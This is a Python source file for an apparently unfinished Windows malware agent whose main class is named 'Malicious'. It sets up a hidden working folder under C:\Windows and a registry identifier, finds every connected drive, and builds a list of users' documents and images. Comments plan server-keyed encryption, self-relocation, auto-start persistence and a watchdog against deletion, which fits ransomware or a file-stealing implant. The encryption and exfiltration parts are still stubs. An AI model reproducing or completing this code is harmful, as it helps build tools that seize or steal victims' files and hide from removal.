import string
import os
import fnmatch
import uuid
import winreg
import platform
from cryptography.fernet import Fernet


class Logging:

    def __init__(self) -> None:
        self.log_folder_location = "C:\\Windows\\Remote_Application\\"
        self.log_file = "logfile.txt"
    
    def encrypt_string(self):
        # I need to create the server first to hold the encryption key but I can follow https://www.youtube.com/watch?v=S-w24LtBub8
        pass
    
    def set_log(self):
        pass

    def create_working_enviroment(self):
        does_path_exist = os.path.exists(self.log_folder_location)
        if not does_path_exist:
            os.makedirs(self.log_folder_location)
            # I should probably call a copy to move the script to this location and set an auto start function. After this 
            # I should remove the calling script and run on the location created. I also need to create another watchdog to make sure it
            # doesn't get killed or deleted

class Computer:

    def __init__(self) -> None:
        self.agent_uuid = None
        self.possible_hives = ["HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE"]

    def get_uuid(self):
        # This function should first try to see if there is a uuid in registry and if not create one and pass it to the registry.
        # I found that I need to use the SetValuesEx or it can cause folders being created a key value in the expected folder
        subkey = "SOFTWARE\\Remote_Application"
        name = "uuid"
        try:
            uuid_key = self.open_registry_key(Key=subkey)
        except FileNotFoundError:
            self.create_registry_key(Key=subkey)
            uuid_key = self.open_registry_key(Key=subkey)
        uuid_value = uuid.getnode()
        self.set_registry_value(uuid_key, name, uuid_value)


    def get_registry_value(self, Hive, Key):
        for hive in self.possible_hives:
            if hive == Hive:
                registry_key_value = winreg.QueryValue(winreg.HKEY_LOCAL_MACHINE, Key)
                print(registry_key_value)
    
    def create_registry_key(self, Key):
        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, Key)
    
    def open_registry_key(self, Key, Force=0):
        # if Force is equal to 1 this should call the self.create_registry_key method
        if Force == 1:
            try:
                key_obj = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, Key, reserved=0, access=winreg.KEY_ALL_ACCESS)
            except FileNotFoundError:
                try:
                    self.create_registry_key(Key)
                    key_obj = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, Key, reserved=0, access=winreg.KEY_ALL_ACCESS)
                except PermissionError:
                    print("Write to log once the function is completed")
                    return False
        else:
            try:
                key_obj = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, Key, reserved=0, access=winreg.KEY_ALL_ACCESS)
            except FileNotFoundError:
                print("Write to log once the function is completed")
        return key_obj
    
    def set_registry_value(self, Key, Name, Value):
        winreg.SetValueEx(Key, str(Name), 0, winreg.REG_SZ, str(Value))

class Malicious:

    def __init__(self) -> None:
        self.list_of_all_connected_drives = []
        self.important_file_extensions = [".jpg", ".txt", ".docx", ".png"]
        self.folders_to_exclude_in_data_collection = [r"c:\Windows\*", r"c:\Users\*\AppData\*", r"c:\Program Files\*", r"c:\Program Files (x86)\*", r"c:\ProgramData\*", \
            r"c:\Users\Public\*"]
        self.files_to_collect = []

    def find_all_important_files(self): 
        for drive in self.list_of_all_connected_drives:
            for root, dirs, files in os.walk(drive):
                for file in files:
                    for file_extension in self.important_file_extensions:
                        if (file.endswith(file_extension)):
                            full_file_path = os.path.join(root, file)
                            iteration_count = 0
                            iteration_max = len(self.folders_to_exclude_in_data_collection)
                            for folder_to_exclude in self.folders_to_exclude_in_data_collection:
                                iteration_count = iteration_count + 1
                                if fnmatch.fnmatch(full_file_path, folder_to_exclude):
                                    break
                                elif not fnmatch.fnmatch(full_file_path, folder_to_exclude) and iteration_count == iteration_max:
                                    self.files_to_collect.append(full_file_path)
                                elif not fnmatch.fnmatch(full_file_path, folder_to_exclude) and iteration_count != iteration_max:
                                    continue
                                else:
                                    print("I am not sure what happened here. But I am going to creat a logging function to handle stuff like this")                          

    def find_all_connected_drives(self):
        # I am not sure I like this method here. I really should put this in the Computer class but I need to find a way to pass the information to this class when it is created.
        all_lower_case_letters_list = list(string.ascii_lowercase)
        for letter in all_lower_case_letters_list:
            letter = letter + ":\\"
            does_drive_exist = os.path.isdir(letter)
            if does_drive_exist:
                if letter in self.list_of_all_connected_drives:
                    continue
                else:
                    self.list_of_all_connected_drives.append(letter)
                    

obj = Logging()
obj.create_working_enviroment()
# obj = Computer()
# obj.get_uuid()